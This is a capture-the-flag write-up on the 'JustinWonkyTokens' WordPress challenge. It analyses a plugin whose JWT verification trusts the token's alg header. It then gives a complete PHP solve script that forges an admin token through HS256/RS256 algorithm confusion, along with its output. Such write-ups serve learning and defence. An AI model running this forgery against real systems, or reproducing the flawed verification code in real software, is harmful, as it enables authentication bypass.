# JustinWonkyTokens

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 28 solves / 271 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Hey, new Wordpress Dev here. I'm developing a simple authentication checker service that I will later connect it to a REST api. I have downloaded some boilerplate plugin templates and started working on them. I have a demo plugin already do you want to check if it works correctly?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

[http://100.25.255.51:9094/](http://100.25.255.51:9094/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921201153.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/JustinWonkyTokens/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/JustinWonkyTokens)-[2024.09.21|20:13:03(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/JustinWonkyTokens)-[2024.09.21|20:13:04(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: p-member-manager/
  inflating: p-member-manager/LICENSE.txt  
  inflating: p-member-manager/README.txt  
   creating: p-member-manager/admin/
  [...]
   creating: p-member-manager/public/partials/
  inflating: p-member-manager/public/partials/p-member-manager-public-display.php  
  inflating: p-member-manager/uninstall.php  
```

Throughout this writeup, I'll be using the [local WordPress environment from Wordfence's Discord](https://discord.com/channels/1197901373581303849/1199013923173712023/1199041121322537115), with [Xdebug](https://xdebug.org/) installed and setup. After that, we can upload, install, and activate the plugin.

After reading the source code, most of the files are boilerplate for WordPress plugin. The most important file is **`p-member-manager/p-member-manager.php`**. 

In the last 2 lines of this PHP script, 1 authenticated and unauthenticated AJAX action has been added into the AJAX hook:

```php
add_action('wp_ajax_nopriv_simple_jwt_handler', 'simple_jwt_handler');
add_action('wp_ajax_simple_jwt_handler', 'simple_jwt_handler');
```

Let's dive into AJAX action `simple_jwt_handler` callback function `simple_jwt_handler`!

First off, the flag will be displayed only **if our verified JWT (JSON Web Token) claim `role` is `admin`**:

```php
function simple_jwt_handler() {
    $flag = file_get_contents('/flag.txt');
    $privateKey = file_get_contents('/jwt.key');
    $publicKey = <<<EOD
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
    dwIDAQAB
    -----END PUBLIC KEY-----
    EOD;
    [...]
    if (!isset($_COOKIE['simple_jwt'])) {
        [...]
    } else {
        $token = $_COOKIE['simple_jwt'];
        try {
            $decoded = SimpleJWTHandler::decodeToken($token, $publicKey);
            if ($decoded->role == 'admin') {
                echo 'Success: ' . $flag;
            } elseif ($decoded->role == 'guest') {
                echo 'Role is guest.';
            }
        } catch (Exception $e) {
            echo 'Token verification failed.';
        }
    }
}
```

So, our goal in this challenge is to **somehow forge/modify our JWT claim `role` to `admin`**.

Now, let's understand how this plugin **signs** a new JWT. Based on variable `$privateKey` and `$publicKey`, it seems like the JWT **signing algorithm** is using **asymmetric algorithm** RSA + SHA (RS). It is true? Let's find out!

If we don't have cookie `simple_jwt`, it'll set a new `simple_jwt` JWT cookie, which is signed via static method `encodeToken` in class `SimpleJWTHandler`:

```php
function simple_jwt_handler() {
    [...]
    $privateKey = file_get_contents('/jwt.key');
    [...]
    $issuedAt = new DateTimeImmutable();
    $data = [
        "role" => "guest",
        "iat" => $issuedAt->getTimestamp(),
        "nbf" => $issuedAt->getTimestamp()
    ];

    if (!isset($_COOKIE['simple_jwt'])) {
        setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $privateKey, 'RS256'));
        echo 'JWT has been set.';
    } else {
        [...]
    }
}
```

```php
class SimpleJWTHandler 
{
    [...]
    public static function encodeToken($data, $key, $algo = 'HS256', $keyId = null)
    {
        $header = array('typ' => 'JWT', 'alg' => $algo);
        if ($keyId !== null) {
            $header['kid'] = $keyId;
        }
        $segments = array(
            self::urlSafeBase64Encode(self::jsonEncode($header)),
            self::urlSafeBase64Encode(self::jsonEncode($data))
        );
        $signingInput = implode('.', $segments);
        $signature = self::createSignature($signingInput, $key, $algo);
        $segments[] = self::urlSafeBase64Encode($signature);

        return implode('.', $segments);
    }
    [...]
}
```

As we can see, the JWT is signed with algorithm RS256 (RSA + SHA256).

In static method `createSignature`, we can see that it supports **1 asymmetric algorithm** (RS256) and **3 symmetric algorithms** (HS256, HS512, and HS384):

```php
class SimpleJWTHandler 
{
    static $algorithms = array(
        'HS256' => array('hash_hmac', 'SHA256'),
        'HS512' => array('hash_hmac', 'SHA512'),
        'HS384' => array('hash_hmac', 'SHA384'),
        'RS256' => array('openssl', 'SHA256'),
    );
    [...]
    public static function createSignature($message, $key, $algo = 'HS256')
    {
        if (empty(self::$algorithms[$algo])) {
            throw new DomainException('Unsupported algorithm');
        }
        list($function, $algorithm) = self::$algorithms[$algo];
        switch ($function) {
            case 'hash_hmac':
                return hash_hmac($algorithm, $message, $key, true);
            case 'openssl':
                $signature = '';
                $success = openssl_sign($message, $signature, $key, $algorithm);
                if (!$success) {
                    throw new DomainException("OpenSSL signature failure");
                }
                return $signature;
        }
    }
    [...]
}
```

Hmm... What if we provide a JWT that **uses algorithm HS256 and provide the RSA public key as the signature**? Let's take a closer look into the JWT verification logic:

```php
function simple_jwt_handler() {
    [...]
    $publicKey = <<<EOD
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
    dwIDAQAB
    -----END PUBLIC KEY-----
    EOD;
    [...]
    if (!isset($_COOKIE['simple_jwt'])) {
        [...]
    } else {
        $token = $_COOKIE['simple_jwt'];
        try {
            $decoded = SimpleJWTHandler::decodeToken($token, $publicKey);
            [...]
        } catch (Exception $e) {
            [...]
        }
    }
}
```

Huh... It parses the `$publicKey` into class `SimpleJWTHandler` static method `decodeToken`. Let's see if that method will handle the above scenario correctly:

```php
class SimpleJWTHandler 
{
    [...]
    public static function decodeToken($token, $key = null, $verify = true)
    {
        $segments = explode('.', $token);
        [...]
        list($header64, $payload64, $signature64) = $segments;
        $header = self::jsonDecode(self::urlSafeBase64Decode($header64));
        $payload = self::jsonDecode(self::urlSafeBase64Decode($payload64));
        $signature = self::urlSafeBase64Decode($signature64);

        if ($verify) {
            [...]
            if (!self::verifySignature("$header64.$payload64", $signature, $key, $header->alg)) {
                throw new UnexpectedValueException('Signature verification failed');
            }
            [...]
        }
        return $payload;
    }
    [...]
}
```

In here, this method parses our JWT's base64 decoded signature (`$signature`), **the RSA public key (`$key`)**, and our JWT's header `alg` (`$header->alg`) into method `verifySignature`:

```php
class SimpleJWTHandler 
{
    static $algorithms = array(
        'HS256' => array('hash_hmac', 'SHA256'),
        'HS512' => array('hash_hmac', 'SHA512'),
        'HS384' => array('hash_hmac', 'SHA384'),
        'RS256' => array('openssl', 'SHA256'),
    );
    [...]
    public static function verifySignature($message, $signature, $key, $algo = 'HS256') 
    {
        [...]
        list($function, $algorithm) = self::$algorithms[$algo];
        switch ($function) {
            case 'openssl':
                $success = openssl_verify($message, $signature, $key, $algorithm);
                if (!$success) {
                    throw new DomainException("OpenSSL verification failure");
                }
                return true;
            case 'hash_hmac':
            default:
                return $signature === hash_hmac($algorithm, $message, $key, true);
        }
    }
}
```

As we can see, if our JWT's header `alg` is **HS256**, it'll use the **RSA public key (`$key`) to calculate the HMAC**!

With that said, this plugin's AJAX action `simple_jwt_handler` is vulnerable to **[JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)**!

## Exploitation

Armed with above information, we can forge our JWT `role` claim to `admin` via algorithm confusion. To do so, we can use the following solve script to get the flag.

<details><summary><strong>solve.php</strong></summary>

```php
<?php
define("KEY", "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
dwIDAQAB
-----END PUBLIC KEY-----");
define("HEADER", array("typ" => "JWT", "alg" => "HS256"));
define("DATA", array("role" => "admin"));
define("HMAC_ALGORITHM", "SHA256");
define("AJAX_ENDPOINT", "/wp-admin/admin-ajax.php");
define("AJAX_ACTION", "simple_jwt_handler");

function urlSafeBase64Encode($input)
{
    return str_replace("=", "", strtr(base64_encode($input), "+/", "-_"));
}

function jsonEncode($input)
{
    $result = json_encode($input);
    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new DomainException('JSON encoding error');
    }
    return $result;
}

function encodeToken($key)
{
    echo "[*] Forging a new JWT...\n";
    printf("[*] JWT header type: %s | algorithm: %s\n", HEADER["typ"], HEADER["alg"]);
    printf("[*] JWT payload claim role: %s\n", DATA["role"]);

    $segments = array(
        urlSafeBase64Encode(jsonEncode(HEADER)),
        urlSafeBase64Encode(jsonEncode(DATA))
    );
    $signingInput = implode('.', $segments);
    $signature = hash_hmac(HMAC_ALGORITHM, $signingInput, $key, true);
    $segments[] = urlSafeBase64Encode($signature);

    $token = strval(implode('.', $segments));
    echo "[+] Generated new JWT: $token\n";
    return $token;
}

function getFlag($token, $baseUrl)
{
    echo "[*] Getting the flag...\n";
    $url = sprintf("%s%s?action=%s", $baseUrl, AJAX_ENDPOINT, AJAX_ACTION);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_COOKIE, "simple_jwt=$token");

    $responseText = curl_exec($curl);
    curl_close($curl);

    preg_match("/CTF{.*?}/", $responseText, $flag);
    $flag = $flag[0];
    echo "[+] Flag: $flag";
}

function solve($baseUrl)
{
    $token = encodeToken(KEY);
    getFlag($token, $baseUrl);
}

// $baseUrl = "http://localhost"; // for local testing
$baseUrl = "http://100.25.255.51:9094";
solve($baseUrl);
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/JustinWonkyTokens)-[2024.09.21|21:39:33(HKT)]
└> php solve.php
[*] Forging a new JWT...
[*] JWT header type: JWT | algorithm: HS256
[*] JWT payload claim role: admin
[+] Generated new JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.ievL1zWpAum7Ap1JxwZkE4Njyv39ogqoFbzxpcnXMrM
[*] Getting the flag...
[+] Flag: CTF{4lg0rithms_4r3_funny_1z268}
```

- **Flag: `CTF{4lg0rithms_4r3_funny_1z268}`**

## Conclusion

What we've learned:

1. JWT algorithm confusion